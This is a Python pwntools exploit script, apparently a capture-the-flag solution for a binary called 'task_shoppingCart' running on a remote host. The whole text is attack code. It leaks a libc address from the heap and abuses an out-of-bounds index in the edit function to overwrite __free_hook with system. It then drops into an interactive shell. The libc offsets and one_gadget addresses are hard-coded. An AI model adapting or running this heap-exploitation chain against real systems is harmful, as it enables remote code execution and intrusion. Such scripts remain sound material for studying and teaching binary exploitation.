
from pwn import *
import time
debug=0
lib = 0

if lib==0:
	libc_name = '/lib/x86_64-linux-gnu/libc.so.6'
	offset = 0x230
	one_gadget = [0x45216,0x4526a,0xf0274,0xf1117]
else:
	libc_name = '/lib/x86_64-linux-gnu/libc.so.6'
	offset = 0x260
	one_gadget = [0x45216,0x4526a,0xef6c4,0xf0567]
context.log_level = 'debug'
elf = ELF('./task_shoppingCart')
#libc = ELF('./libc_64.so.6')

#@one_gadget = [0x45216,0x4526a,0xef6c4,0xf0567]
if debug:
	p= process('./task_shoppingCart')#,env={'LD_PRELOAD' :libc_name})
	
	libc = ELF(libc_name)
else:
	p = remote( '117.78.26.133', 31666)#process('./pwn1')
	libc = ELF(libc_name)
	offset = 0x230

def add(size,name):
	p.recvuntil("Now, buy buy buy!")
	p.sendline('1')
	p.recvuntil("name?")
	p.sendline(str(size))
	p.recvuntil("What is your goods name?")
	p.send(name)

def delete(idx):
	p.recvuntil("Now, buy buy buy!")
	p.sendline('2')
	p.recvuntil("Which goods that you don't need?")
	p.sendline(str(idx) )


def edit(idx):
	p.recvuntil("Now, buy buy buy!")
	p.sendline('3')	
	p.recvuntil("Which goods you need to modify?")
	p.sendline(str(idx))
def edit_vul(context):
	p.recvuntil("Now, buy buy buy!")
	p.sendline('3')	
	p.recvuntil("Which goods you need to modify?")
	p.send(context)

for i in range(0x13):
	p.recvuntil("EMMmmm, you will be a rich man!")
	p.sendline('1')
	p.recvuntil("I will give you $9999, but what's the  currency type you want, RMB or Dollar?")
	p.sendline('a'*8)
p.recvuntil("EMMmmm, you will be a rich man!")
p.sendline('1')
p.recvuntil("I will give you $9999, but what's the  currency type you want, RMB or Dollar?")
p.sendline('b'*8)	
p.recvuntil("EMMmmm, you will be a rich man!")
p.sendline('3')

#add(0x123,'p4nda')
#delete('0')
#add(0x100,'p4nda')
#raw_input()
#edit( (0x202140+19*8 - 0x2021E0 )/8 &0xffffffffffffffff )
#p.send('d'*8)

add(0x100,'p4nda') #0
add(0x70,'/bin/sh\0') #1
delete(0)
#gdb.attach(p,'')
#raw_input()

add(0,'')#2
edit(2)
#raw_input()
p.recvuntil('OK, what would you like to modify ')
libc_addr = u64(p.recv(6).ljust(8,'\0'))
libc.address = libc_addr- 0x10 - 344 -libc.symbols['__malloc_hook'] 
p.send('p4nda')
print '[+] leak',hex(libc_addr) 
print '[+] system',hex(libc.symbols['system']) 
#raw_input()
edit( (0x202140+19*8 - 0x2021E0 )/8 &0xffffffffffffffff )
p.recvuntil('to?')
p.send('d'*8)
payload = (str((0x202140 - 0x2021E0 )/8 &0xffffffffffffffff)+'\n') 
if debug:
	attach(p)
payload+= (str(2)+'\n') 
payload+= (str(1)+'\n')

if debug:
	payload = payload.ljust(0x1000-0x20,'a')
#payload+= p64(libc.symbols['__free_hook']) * ((0x1000-0x100-0xa00)/8)
	payload+= p64(libc.symbols['__free_hook'])
else:
	payload = payload.ljust(0x100,'a')	
	payload+= p64(libc.symbols['__free_hook']) * 0x60
#payload = payload.ljust(0x1000-0x20,'a')
#payload+= p64(libc.symbols['__free_hook']) * ((0x1000-0x100-0xa00)/8)
#payload+= p64(libc.symbols['__free_hook'])

# size = 4112
#gdb.attach(p,'')
edit_vul(payload)
#edit( (0x202140+19*8 - 0x2021E0 )/8 &0xffffffffffffffff )
#p.send('d'*8)
#raw_input()

p.recvuntil('to?')
#
p.send(p64(libc.symbols['system']))

#time.sleep(2)
#delete(2)
#edit( (0x202140+19*8 - 0x2021E0 )/8 &0xffffffffffffffff )
p.interactive()

